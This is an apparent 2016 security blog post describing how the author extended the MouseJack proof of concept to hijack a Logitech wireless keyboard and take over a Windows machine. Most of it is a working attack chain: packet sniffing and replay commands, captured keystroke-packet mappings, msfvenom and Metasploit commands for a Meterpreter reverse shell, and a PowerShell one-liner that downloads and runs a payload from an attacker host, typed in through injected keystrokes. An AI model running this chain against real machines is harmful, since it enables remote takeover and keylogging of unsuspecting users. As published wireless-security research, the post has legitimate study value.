+++
title = "Hijacking Wireless Mice and Keyboards"
date = "2016-07-09 14:40:38 +0300"
tags = ["radio"]
+++
Earlier this year researchers from [**Bastille**](https://www.bastille.net/) discovered vulnerabilities in wireless mice and keyboards that could lead to them being remotely hijacked from as far as 225 meters away. They have a dedicated site detailing the vulnerabilities dubbed [**mousejack**](https://www.mousejack.com/). They also released POC code which I have built on to implement a remote takeover of a machine using a wireless mouse/keyboard.
<!--more-->

I already had in my possession the Logitech Wireless Combo MK220 which consists of a K220 wireless keyboard and an M150 wireless mouse which I used as my test devices. 

![alt](/images/mk220.jpg)

I used the [**Crazyradio PA long range open USB radio dongle**](https://www.bitcraze.io/crazyradio-pa/) as the attack device.
The original mousejack POC code is available on [**Github**]( https://github.com/RFStorm/mousejack) with instructions on how to flash the firmware necessary to perform the attack. I therefore set up both my machine and the Crazyradio PA dongle as described in their POC and tested the functionality they had provided.

![alt](/images/CrazyRadioSide.jpg)

I was then able to scan and sniff the packets transmitted by the mouse/keyboard using the `nrf24-scanner.py` and the `nrf24-sniffer.py` scripts. However, I was more interested in hijacking the mouse/keyboard and controlling the machine remotely. I therefore extended the POC to serve my purposes.

First, I modified the `nrf24-sniffer.py` code to log the sniffed packets to a user specified output file.  

###Sniff packets from address 8C:D3:0F:3E:B4 on all channels and save them to output.log
`./nrf24-sniffer.py --lna -a 8C:D3:0F:3E:B4 -o output.log`

Next, I wrote a new python script `nrf24-replay.py` that would transmit packets read from a log file. 
This would replay captured packets or transmit generated ones and follow the wireless USB dongle as it hopped through the channels.

###Send packets from the file keystroke.log to address 8C:D3:0F:3E:B4 on a hopping channel
`./nrf24-replay.py --lna -a 8C:D3:0F:3E:B4 -v -t 10 -i keystroke.log`

With this in place I could now begin the hijack phase.
The first thing was to capture and study different key presses and interesting key combinations. From there I created mappings of the key presses to their corresponding packets. A sample of the digit mappings looks like this:

`1	B4:D3:68:62:72:7D:CC:4B:C4:DD:F5:DE:EB:F3:00:00:00:00:00:00:00:57`  
`2	00:D3:C1:1E:FE:28:B4:AB:8B:34:F5:DE:EB:F5:00:00:00:00:00:00:00:57`  
`3	00:D3:8B:94:36:32:63:B0:7D:82:F5:DE:EB:F7:00:00:00:00:00:00:00:DF`  
`4	00:D3:F6:E7:3C:36:52:67:28:1E:F5:DE:EB:F9:00:00:00:00:00:00:00:28`  
`5	00:D3:46:06:1E:DB:58:93:57:03:F5:DE:EB:FB:00:00:00:00:00:00:00:EA`  
`6	00:D3:BC:9B:18:BA:EE:93:6D:3C:F5:DE:EB:FD:00:00:00:00:00:00:00:1F`  
`7	00:D3:47:7D:FC:44:55:5E:E4:78:F5:DE:EB:FF:00:00:00:00:00:00:00:5D`  
`8	00:D3:BE:11:A7:CC:9D:75:7A:A5:F5:DE:EC:01:00:00:00:00:00:00:00:FA`  
`9	00:D3:A1:E6:E7:E1:DC:6C:70:31:F5:DE:EC:03:00:00:00:00:00:00:00:33`  
`0	00:D3:C5:01:FC:0A:F0:6C:B7:6D:F5:DE:EC:05:00:00:00:00:00:00:00:1D`  

I also did the same for useful key combinations such as `ALT-F2`, `ALT-F4` and so on.  
I then wrote a python script called `keymapper.py` that would create a log file of packets of the corresponding key presses.

Now I could generate packets and save them to a log file and then wirelessly hijack the mouse/keyboard and perform various operations on the target machine.

Powershell is becoming one of the mot effective avenues of attacking a Windows machine. I therefore used the following approach to accomplish the full hijack of a target machine:

- Generate and host a powershell payload on the attack server  
`msfvenom -p windows/meterpreter/reverse_tcp lhost=ip lport=port -f psh-cmd -o update.ps1`

- Start a metasploit listener on our attack server  
`msfconsole`  
`use exploit/multi/handler`  
`set LHOST IP`  
`set LPORT PORT`  
`set PAYLOAD windows/meterpreter/reverse_tcp`  
`exploit -j`  

- Translate our powershell one liner to the corresponding packets using the `keymapper.py` script  
```
./keymapper.py
powershell "iex (new-object net.webclient).downloadstring('http://IP/update.ps1')"
```
- Hijack the target's wireless mouse/keyboard and wait for their machine to connect back to the attack server
`./nrf24-replay.py --lna -a 8C:D3:0F:3E:B4 -i shell.log -t 10`  

- Perform post exploitation on the target machine

I have uploaded the POC code [**here**](https://github.com/iamckn/mousejack_transmit) on Github.

A POC video of the hijack described can be found below where I take over a Windows 7 machine and perform keylogging post-exploitation.  

{{< youtube YLzUeK1IvJs >}} 

Further research on different wireless mice/keyboards is ongoing, more so on the packet composition and encryption. 

Till next time, happy hacking! 
